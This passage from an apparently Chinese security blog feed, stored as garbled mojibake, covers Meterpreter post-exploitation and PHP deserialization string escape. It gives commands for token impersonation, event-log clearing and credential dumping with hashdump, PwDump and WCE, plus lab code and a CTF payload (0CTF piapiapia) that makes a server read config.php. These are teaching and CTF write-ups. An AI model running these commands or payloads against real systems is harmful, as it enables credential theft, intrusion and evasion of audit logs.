Token)æ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦</p></li></ul><h4 id="Kerberosåè®®"><a class="header-anchor" href="#Kerberosåè®®">ğŸ­</a>Kerberosåè®®</h4><p><img src="/2021/03/05/wei2/1.png" alt="1"></p><h4 id="æ­¥éª¤"><a class="header-anchor" href="#æ­¥éª¤">ğŸ­</a>æ­¥éª¤</h4><blockquote><p>å…ˆ<code>use incognito</code>åŠ è½½åŠŸèƒ½</p><p>å†<code>list_tokens -u </code> åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œ</p><blockquote><p>ä¸€èˆ¬æœ‰ä¸¤ç§ç±»å‹çš„ä»¤ç‰Œï¼š</p><p><code>Delegation Tokens</code>(æˆæƒä»¤ç‰Œ)æ”¯æŒäº¤äº’å¼ç™»å½•</p><p><code>Impersonation Tokens</code>(æ¨¡æ‹Ÿä»¤ç‰Œ),éäº¤äº’çš„ä¼šè¯</p><p>ä»¤ç‰Œçš„æ•°é‡å–å†³äºMeterpreter Shellçš„è®¿é—®çº§åˆ«</p></blockquote></blockquote><blockquote><p>ä»å¾—åˆ°çš„ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°æœ‰æ•ˆä»¤ç‰Œå…¶æ ¼å¼ä¸º<code>ä¸»æœºå\ç™»å½•çš„ç”¨æˆ·å</code></p><p>è°ƒç”¨<code>impersonate_token HOSTNAME\\USERNAME </code> å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œ</p><p>å‡å†’æˆåŠŸğŸŒğŸŒğŸŒ</p></blockquote><h4 id="æ¸…é™¤äº‹ä»¶æ—¥å¿—"><a class="header-anchor" href="#æ¸…é™¤äº‹ä»¶æ—¥å¿—">ğŸ­</a>æ¸…é™¤äº‹ä»¶æ—¥å¿—</h4><p>å®Œæˆæ”»å‡»æ“ä½œä¹‹åä½¿ç”¨å‘½ä»¤â€œclearevâ€å‘½ä»¤æ¸…é™¤äº‹ä»¶æ—¥å¿—</p><h2 id="HASHæ”»å‡»"><a class="header-anchor" href="#HASHæ”»å‡»">ğŸ­</a>HASHæ”»å‡»</h2><h4 id="hashdump"><a class="header-anchor" href="#hashdump">ğŸ­</a>hashdump</h4><p>Hashdump Meterpreterè„šæœ¬å¯ä»¥ä»ç›®æ ‡æœºå™¨ä¸­æå–Hashå€¼ï¼Œç ´è§£Hashå€¼å³å¯è·å¾—ç™»å½•å¯†ç ã€‚è®¡ç®—æœºä¸­çš„æ¯ä¸ªè´¦å·çš„ç”¨æˆ·åå’Œå¯†ç éƒ½å­˜å‚¨åœ¨samæ–‡ä»¶ä¸­ï¼Œå½“è®¡ç®—æœºè¿è¡Œæ—¶ï¼Œè¯¥æ–‡ä»¶å¯¹æ‰€æœ‰è´¦å·è¿›è¡Œé”å®šï¼Œè¦æƒ³è®¿é—®å°±å¿…é¡»æœ‰â€œç³»ç»Ÿçº§â€è´¦å·ã€‚æ‰€ä»¥è¦ä½¿ç”¨è¯¥å‘½ä»¤å°±å¿…é¡»è¿›è¡Œæƒé™çš„æå‡ã€‚</p><ul><li><code>hashdump</code>(åªèƒ½åœ¨systemçº§æƒé™ä¸‹)</li><li><code>smart_hashdump</code>æ¨¡å—,<strong>åœ¨windowä¸­å› ä¸ºæœ‰UACæ•…è¦å…ˆç»•è¿‡å®ƒ</strong></li></ul><h4 id="Quarks-PwDump"><a class="header-anchor" href="#Quarks-PwDump">ğŸ­</a>Quarks PwDump</h4><p>åœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¯†ç ä»¥åŠ å¯†çš„æ–¹å¼ä¿å­˜åœ¨/windows/system32cmä¸‹çš„samæ–‡ä»¶é‡Œï¼Œè´¦å·åœ¨ç™»å½•åä¼šå°†å¯†ç çš„å¯†æ–‡å’Œæ˜æ–‡ä¿å­˜åœ¨ç³»ç»Ÿçš„å†…å­˜ä¸­ã€‚æƒ…å†µä¸‹ç³»ç»Ÿå¯åŠ¨åï¼Œsamæ–‡ä»¶æ˜¯ä¸èƒ½è¢«è¯»å–çš„ï¼Œä½†PwDumpå¯ä»¥.</p><p>å‚æ•°:</p><blockquote><p>-dhlï¼šå¯¼å‡ºæœ¬åœ°å“ˆå¸Œå€¼ã€‚<br>-dhdcï¼šå¯¼å‡ºå†…å­˜ä¸­çš„åŸŸæ§å“ˆå¸Œå€¼ã€‚<br>-dhdï¼šå¯¼å‡ºåŸŸæ§å“ˆå¸Œå€¼ï¼Œå¿…é¡»æŒ‡å®šNTDSæ–‡ä»¶ã€‚<br>-dbï¼šå¯¼å‡ºBitlockerä¿¡æ¯ï¼Œå¿…é¡»æŒ‡å®šNTDSæ–‡ä»¶ã€‚<br>-ntï¼šå¯¼å‡ºNTDSæ–‡ä»¶ã€‚<br>-hist:å¯¼å‡ºå†å²ä¿¡æ¯ï¼Œå¯é€‰é¡¹ã€‚<br>-tï¼šå¯é€‰å¯¼å‡ºç±»å‹ï¼Œé»˜è®¤å¯¼å‡ºJohnç±»å‹ã€‚<br>-0ï¼šå¯¼å‡ºæ–‡ä»¶åˆ°æœ¬åœ°ã€‚</p></blockquote><h4 id="Windows-Credentials-Editor"><a class="header-anchor" href="#Windows-Credentials-Editor">ğŸ­</a>Windows Credentials Editor</h4><p>WCEèƒ½åˆ—ä¸¾ç™»å½•ä¼šè¯ï¼Œæ·»åŠ ã€æ”¹å˜å’Œåˆ é™¤ç›¸å…³å‡­æ®(ä¾‹å¦‚LM/NT Hash)ã€‚è¿™äº›åŠŸèƒ½åœ¨å†…ç½‘æ¸—é€ä¸­èƒ½å¤Ÿè¢«åˆ©ç”¨,ä½†å¿…é¡»åœ¨ç®¡ç†å‘˜æƒé™ä¸‹ä½¿ç”¨ï¼Œè¿˜è¦æ³¨æ„æ€æ¯’å·¥å…·çš„å…æ€ã€‚</p><blockquote><p>å…ˆç”¨<code>upload/root/wce.exe c:\</code>å‘½ä»¤å°†wce.exeä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºCç›˜ä¸­</p><p>ç„¶ååœ¨ç›®æ ‡æœºShellä¸‹ç”¨<code>wce-w</code>æå–ç³»ç»Ÿæ˜æ–‡ç®¡ç†å‘˜çš„å¯†ç </p></blockquote><p>å‚æ•°:</p><blockquote><p>-l   è¯»å–æ•°æ®æ ¼å¼<code>username:domain:lmï¼šntlm</code>(ä»å†…å­˜ä¸­è¯»å–å·²ç»ç™»å½•çš„ä¿¡æ¯,é»˜è®¤çš„è¯»å–æ–¹å¼æ˜¯å…ˆç”¨å®‰çš„æ–¹å¼è¯»å–ï¼Œè‹¥è¯»å–å¤±è´¥å†ç”¨ä¸å®‰å…¨çš„æ–¹å¼ï¼Œ</p><p>-f   å¼ºåˆ¶ä½¿ç”¨å®‰å…¨çš„æ–¹å¼è¯»å–</p><p>-g  è®¡ç®—å¯†ç ï¼Œåˆ¶å®šä¸€ä¸ªç³»ç»Ÿæ˜æ–‡ä¼šä½¿ç”¨çš„åŠ å¯†æ–¹æ³•æ¥è®¡ç®—å¯†æ–‡</p><p>-c  æŒ‡å®šä¼šè¯æ‰§è¡Œcmd</p><p>-v  æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</p><p>-w  æŸ¥çœ‹å·²ç™»å½•çš„æ˜æ–‡å¯†ç </p><p>-s  æ›´æ”¹å½“å‰ç™»å½•ä¼šè¯çš„NTLMå‡­æ®ã€‚å‚æ•°:&lt;ç”¨æˆ·å&gt;:&lt;åŸŸå&gt;:&lt; LMHash &gt;: &lt; NTHash &gt;</p><p>-r  æ— é™æœŸåœ°åˆ—å‡ºç™»å½•ä¼šè¯å’ŒNTLMå‡­è¯ã€‚å¦‚æœå‘ç°æ–°çš„ä¼šè¯ï¼Œæ¯5ç§’åˆ·æ–°ä¸€æ¬¡;å¯é€‰:- r &lt;åˆ·æ–°é—´éš”&gt;</p><p>-e  æ— é™æœŸåœ°åˆ—å‡ºç™»å½•ä¼šè¯NTLMå‡­è¯ã€‚æ¯æ¬¡å‘ç”Ÿç™»å½•äº‹ä»¶æ—¶åˆ·æ–°</p><p>-o  å°†æ‰€æœ‰è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚å‚æ•°:&lt;æ–‡ä»¶å&gt;</p><p>-i  æŒ‡å®šLUIDè€Œä¸æ˜¯ä½¿ç”¨å½“å‰ç™»å½•ä¼šè¯ã€‚å‚æ•°:&lt; luid &gt;</p><p>-d  ä»ç™»å½•ä¼šè¯ä¸­åˆ é™¤NTLMå‡­è¯ã€‚å‚æ•°:&lt; luid &gt;</p></blockquote><p>ç§‘æ™®å®Œæˆâ˜€ï¸â˜€ï¸â˜€ï¸</p><p>å‚è€ƒ:</p><p>ã€Šwebå®‰å…¨æ”»é˜²æ¸—é€æµ‹è¯•å®æˆ˜æŒ‡å—ã€‹</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106311397">https://blog.csdn.net/smli_ng/article/details/106311397</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–ï¼ˆäºŒï¼‰â€”â€”å­—ç¬¦ä¸²é€ƒé€¸</title>
    <link href="/2021/03/03/wei3/"/>
    <url>/2021/03/03/wei3/</url>
    
    <content type="html"><![CDATA[<h3 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h3><blockquote><p><strong>phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ– ã€‚</strong></p><blockquote><p>è¶…å‡ºçš„éƒ¨åˆ†å¹¶ä¸ä¼šè¢«ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™è¯´æ˜ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€‚è€Œä¸”ååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥<code>&quot;;&#125;</code>ç»“æŸçš„ï¼Œé‚£å¦‚æœæŠŠ<code>&quot;;&#125;</code>æ·»å…¥åˆ°éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ç›¸åº”çš„ä¸¢å¼ƒäº†</p></blockquote></blockquote><blockquote><p><strong>é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šæŠ¥é”™</strong></p><blockquote><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦å»è¯»å–åè¾¹çš„å­—ç¬¦ã€‚å¦‚æœæŒ‡å®šçš„é•¿åº¦é”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥<br><img src="/2021/03/03/wei3/1.png" alt="1"></p></blockquote></blockquote><blockquote><p><strong>å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ </strong></p></blockquote><h3 id="ç±»å‹"><a class="header-anchor" href="#ç±»å‹">ğŸ­</a>ç±»å‹</h3><h4 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a class="header-anchor" href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š">ğŸ­</a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lemon</span>(<span class="hljs-params">$string</span>)</span>&#123;$lemon = <span class="hljs-string">&#x27;/p/i&#x27;</span>;<span class="hljs-keyword">return</span> preg_replace($lemon,<span class="hljs-string">&#x27;ww&#x27;</span>,$string);&#125;$username = $_GET[<span class="hljs-string">&#x27;a&#x27;</span>];$age = <span class="hljs-string">&#x27;20&#x27;</span>;$user = <span class="hljs-keyword">array</span>($username,$age);var_dump(serialize($user));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$r = lemon(serialize($user));var_dump($r);var_dump(unserialize($r));<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å…¥apple</p><p><img src="/2021/03/03/wei3/2.jpg" alt="2"></p><p>appleä¸­ä¸¤ä¸ª<code>p</code>è¢«æ›¿æ¢æˆå››ä¸ª<code>w</code>,ä½†æ˜¯é•¿åº¦å¹¶æ²¡æœ‰å˜åŒ–ï¼Œæ ¹æ®ååºåˆ—åŒ–çš„ç‰¹ç‚¹ï¼ŒæŒ‡å®šçš„é•¿åº¦é”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚å€Ÿè¿™ä¸ªè¿‡æ»¤ï¼Œå¯ä»¥å»ä¿®æ”¹ageçš„å€¼ã€‚åŸæ¥åºåˆ—åŒ–å<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>é•¿åº¦ä¸º16ï¼Œå½“è¾“å…¥ä¸€ä¸ª<code>p</code>ä¼šæ›¿æ¢æˆ<code>ww</code>ï¼Œæ‰€ä»¥å¦‚æœè¾“å…¥16ä¸ªpï¼Œé‚£ä¹ˆä¼šç”Ÿæˆ32ä¸ªçš„<code>w</code>ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¾“å…¥16ä¸ªpå†åŠ ä¸Šæ„é€ çš„ç›¸åŒä½æ•°çš„<code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code>ï¼Œæ°å¥½æ˜¯32ä½ï¼Œå³ï¼š</p><p><img src="/2021/03/03/wei3/3.jpg" alt="3"></p><p>åœ¨è¿‡æ»¤åçš„åºåˆ—åŒ–æ—¶ä¼šè¢«32ä¸ªwå…¨éƒ¨å¡«å……ï¼Œä»è€Œä½¿æ„é€ çš„ä»£ç  <code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code> æˆåŠŸé€ƒé€¸ï¼Œä¿®æ”¹äº†ageçš„å€¼ï¼Œè€ŒåŸæ¥çš„é‚£<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>åˆ™è¢«å¿½ç•¥äº†ï¼ˆ<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥<code>&quot;;&#125;</code>ç»“æŸçš„</strong>)ï¼Œæˆ‘ä»¬ä¼ å…¥çš„<code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code>å·²ç»åœ¨å‰é¢æˆåŠŸé—­åˆäº†</p><h4 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a class="header-anchor" href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘">ğŸ­</a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h4><p>å®éªŒç¯å¢ƒä»£ç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params">$string</span>)</span>&#123;<span class="hljs-keyword">return</span> preg_replace( <span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, $string);&#125;$test[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];$test[<span class="hljs-string">&#x27;sign&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;sign&#x27;</span>]; $test[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.$fake[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.$fake[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.$fake[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>éšæ„è¾“å…¥</p><p><img src="/2021/03/03/wei3/4.jpg" alt="4"></p><p>numberçš„å€¼è¢«å›ºå®šï¼Œåœ¨str_repå‡½æ•°ä¸­å¦‚æœæ£€æµ‹åˆ°â€™phpâ€™,'testâ€™å…³é”®å­—å°±æŠŠå…¶æ›¿æ¢ä¸ºç©º,é‚£ä¹ˆå°±åˆ©ç”¨è¿™ä¸€ç‚¹,æˆ‘ä»¬æ•…æ„è¾“å…¥æ•æ„Ÿå­—ç¬¦,æ›¿æ¢ä¸ºç©ºä¹‹åæ¥å®ç°å­—ç¬¦é€ƒé€¸.(æ³¨æ„è€ƒè™‘é—­åˆé—®é¢˜)æ„é€ payloadï¼š<code>name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code></p><p><img src="/2021/03/03/wei3/6.png" alt="6"></p><h4 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">ğŸ­</a>ä¾‹é¢˜</h4><h5 id="0CTF-2016-piapiapiaï¼ˆè¿‡æ»¤åå­—ç¬¦å¢å¤šï¼‰"><a class="header-anchor" href="#0CTF-2016-piapiapiaï¼ˆè¿‡æ»¤åå­—ç¬¦å¢å¤šï¼‰">ğŸ­</a>[0CTF 2016]piapiapiaï¼ˆè¿‡æ»¤åå­—ç¬¦å¢å¤šï¼‰</h5><p>dirsearchæ‰«æç›®å½•å‘ç°å‡ ä¸ªPHPæ–‡ä»¶ï¼Œå…¶ä¸­config.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$config[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;$config[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;$config[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$config[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$flag = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘æŠŠconfig.phpä¸­çš„æ•°æ®è¯»å‡ºæ¥ï¼Œå› ä¸ºconfig.phpé‡Œé¢æ˜¯æœåŠ¡å™¨æ­å»ºç¯å¢ƒçš„æ—¶å€™è®¾ç½®çš„å‚æ•°ï¼Œç”¨æˆ·éœ€è¦åœ¨config.phpé‡Œé¢è®¾ç½®è‡ªå·±æœ¬åœ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰€ä»¥è¿™ä¸ªæ–‡ä»¶ä¸€å®šä¹Ÿè®¾ç½®äº†è‡ªå·±æœ¬åœ°çš„$flagçš„å€¼ï¼Œä»ç½‘ç«™ç¨‹åºå…¥å£æ–‡ä»¶index.phpå®¡è®¡ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºå½“å®Œæˆç™»å½•éªŒè¯åä¼šè·³è½¬åˆ°profile.php</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;header(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">else</span> &#123;die(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);&#125;</code></pre><p>åœ¨profile.phpä¸­å¦‚æœæ²¡æœ‰å­˜å…¥è¿‡ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯å°†ä¼šè·³è½¬åˆ°update.phpå»ä¸Šä¼ ä¿¡æ¯ï¼Œåä¹‹å°†ç›´æ¥è¯»å–è¯¥ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯å¹¶æ˜¾ç¤ºåˆ°å½“å‰é¡µé¢ä¸­</p><pre><code class="hljs php">$profile=$user-&gt;show_profile($username);<span class="hljs-keyword">if</span>($profile  == <span class="hljs-literal">null</span>) &#123;header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);&#125;<span class="hljs-keyword">else</span> &#123;$profile = unserialize($profile);$phone = $profile[<span class="hljs-string">&#x27;phone&#x27;</span>];$email = $profile[<span class="hljs-string">&#x27;email&#x27;</span>];$nickname = $profile[<span class="hljs-string">&#x27;nickname&#x27;</span>];$photo = base64_encode(file_get_contents($profile[<span class="hljs-string">&#x27;photo&#x27;</span>]));  <span class="hljs-comment">//æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œçªç ´å£</span></code></pre><p>è®© <code>$profile[â€˜photoâ€™]</code>çš„å€¼ä¸º<code>â€œconfig.phpâ€</code>å³å¯,ç”±<code>$nickname = $profile['nickname'];</code>å¯çŸ¥éœ€å°†nicknameå€¼è®¾ä¸ºconfig.php,ä½†æ˜¯<code>$profile['photo']</code>çš„å€¼æ— æ³•ä¿®æ”¹ï¼Œç”±<code>$profile = unserialize($profile)</code>å¯çŸ¥å®ƒçš„å€¼ç”±ååºåˆ—å¾—åˆ°ï¼Œæˆ‘ä»¬å†è·Ÿè¿›ä¸€ä¸‹update.phpï¼Œå‘ç°ä»¥ä¸‹ä¸¤ä¸ªæœ‰åˆ©ç”¨ç‚¹çš„ä»£ç æ®µï¼š</p><p><img src="/2021/03/03/wei3/7.png" alt="7"></p><pre><code class="hljs php">$user-&gt;update_profile($username, serialize($profile));<span class="hljs-comment">//æ­¤å¤„å‡ºç°äº†åºåˆ—åŒ–</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> serialize($profile);&#125;</code></pre><p>ç»§ç»­è·Ÿè¿›åˆ°<code>update_profile()</code>å‡½æ•°</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params">$username, $new_profile</span>) </span>&#123;$username = <span class="hljs-built_in">parent</span>::filter($username);$new_profile = <span class="hljs-built_in">parent</span>::filter($new_profile);$where = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, $new_profile, $where);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;&#125;</code></pre><p>ä¸¤ä¸ªå‚æ•°éƒ½è¢«**filter()**è¿‡æ»¤ï¼Œè·Ÿè¿›ä¸€ä¸‹filterå‡½æ•°</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);&#125;</code></pre><p>æ­¤å‡½æ•°å°†arrayé‡Œçš„å…³é”®å­—å…¨éƒ¨æ›¿æ¢æˆhackerï¼Œä½†å®ƒå¤„ç†çš„å­—ç¬¦ä¸²æ˜¯ååºåˆ—åŒ–åçš„ï¼Œè€Œä¸”ç»è¿‡å¤„ç†ä¹‹åï¼Œå­—ç¬¦ä¸²çš„æŸä¸€éƒ¨åˆ†ä¼šåŠ é•¿ï¼Œä½†æè¿°å…¶é•¿åº¦çš„æ•°å­—æ²¡æœ‰æ”¹å˜ï¼ˆè¯¥æ•°å­—ç”±ååºåˆ—åŒ–æ—¶å˜é‡çš„å±æ€§å†³å®šï¼‰ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´PHPåœ¨æŒ‰è¯¥æ•°å­—è¯»å–ç›¸åº”é•¿åº¦å­—ç¬¦ä¸²åï¼Œæœ¬æ¥å±äºè¯¥å­—ç¬¦ä¸²çš„å†…å®¹é€ƒé€¸å‡ºäº†è¯¥å­—ç¬¦ä¸²çš„ç®¡è¾–èŒƒå›´ã€‚æ•…æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸æ„é€ payload,æˆ‘ä»¬çš„ç›®çš„æ˜¯å°†<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>æ’å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œé¢å»ï¼Œè¿™ä¸ªçš„é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŒ¤å‡ºæ¥34ä½ï¼Œwhereä¼šæ›¿æ¢æˆhackerï¼Œé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ 34ä¸ªwhereï¼š</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</code></p><p><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>å‰é¢è¦å¤šåŠ ä¸€ä¸ª}æ˜¯å› ä¸ºæˆ‘ä»¬nicknameæ„é€ æˆäº†æ•°ç»„ï¼Œè€Œä¸æ˜¯å­—ç¬¦ï¼Œæ‰€ä»¥è¦åŠ }é—­åˆ</p><p>åœ¨update.phpéšæ„è¾“å…¥ä¿¡æ¯æŠ“åŒ…</p><p><img src="/2021/03/03/wei3/8.jpg" alt="8"></p><p>å°†å¾—åˆ°profile.phpå°†å›¾ç‰‡è·¯å¾„è§£ç å³å¯å¾—åˆ°flagã€‚</p><p>æ€»ç»“ï¼špiapiapiaè¿™é“é¢˜çœ‹ä¼¼å®‰å…¨åœ°æŠŠå±é™©å­—ç¬¦ä¸²<code>â€˜selectâ€˜, â€˜insertâ€˜, â€˜updateâ€˜, â€˜deleteâ€˜,  â€˜whereâ€˜</code>æ›¿æ¢æˆ<code>â€˜hackerâ€˜</code>ï¼Œä½†æˆ‘ä»¬å†™å…¥whereæ—¶ä¼šè¢«æ›¿æ¢æˆhackerä¹‹åå­—ç¬¦ä¸²å®é™…çš„é•¿åº¦å°±+1ï¼Œå› æ­¤å®é™…çš„é•¿åº¦å¤§äºåºåˆ—åŒ–å›ºå®šçš„é•¿åº¦ï¼ˆå˜é‡å‰é¢â€˜sâ€™é‡Œçš„å€¼ï¼‰åè€Œå¯¼è‡´äº†ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><h4 id="å®‰æ´µæ¯-2019-easy-serialize-phpï¼ˆè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼‰"><a class="header-anchor" href="#å®‰æ´µæ¯-2019-easy-serialize-phpï¼ˆè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼‰">ğŸ­</a>[å®‰æ´µæ¯ 